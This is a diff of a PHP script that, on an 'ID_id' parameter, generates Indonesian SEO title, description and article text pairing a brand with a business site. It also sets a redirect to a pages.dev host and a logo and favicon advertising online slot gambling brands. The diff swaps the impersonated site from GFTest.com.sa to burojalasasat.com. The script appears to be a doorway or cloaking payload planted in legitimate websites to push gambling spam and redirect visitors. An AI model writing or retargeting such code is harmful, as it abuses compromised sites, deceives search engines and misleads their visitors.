@@ -62,14 +62,14 @@ if (isset($_GET['ID_id'])) {
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND x GFTest.com.sa – Informasi Pengujian, Teknologi, dan Solusi Profesional";
+    $title = "$BRAND x Buroj Al Asasat: Mengenal Bisnis dan Layanan Profesional di Era Modern";
 
-    $description = "$BRAND x GFTest.com.sa menghadirkan informasi mengenai pengujian, teknologi, layanan profesional, standar kualitas, dan solusi modern untuk kebutuhan industri.";
+    $description = "$BRAND x Kenali Buroj Al Asasat melalui informasi mengenai bisnis, layanan profesional, pengembangan usaha, teknologi, dan strategi membangun kehadiran digital.";
     
-    $artikel = "$BRAND x GFTest.com.sa merupakan platform digital yang dapat menjadi sumber informasi mengenai pengujian, teknologi, kualitas, dan berbagai kebutuhan profesional di lingkungan industri modern. Perkembangan teknologi membuat proses pengujian semakin penting untuk memastikan produk, material, sistem, maupun proses memenuhi persyaratan yang telah ditentukan.";
+    $artikel = "$BRAND x Buroj Al Asasat menjadi nama utama yang digunakan oleh platform digital burojalasasat.com. Di tengah perkembangan teknologi dan meningkatnya kebutuhan terhadap informasi online, website memiliki peran penting dalam membantu bisnis maupun organisasi membangun kehadiran digital yang lebih mudah ditemukan dan diakses.";
 
     // Bisa diganti random image atau CDN sendiri
-    $image = "https://i.pinimg.com/1200x/c5/e9/8c/c5e98cf5580d81007baf8b0c7e005076.jpg";
+    $image = "https://i.pinimg.com/1200x/25/66/3d/25663da025a5b02be1044d39bedbf9ae.jpg";
 
     // Canonical URL
     $canonical = $current_url;
@@ -79,7 +79,7 @@ if (isset($_GET['ID_id'])) {
 }
 
 // Redirect target
-$ampmek = "https://gftest.pages.dev/?ID_id=$BRAND";
+$ampmek = "https://burojalasasat.pages.dev/?ID_id=$BRAND";
 $logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 $favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
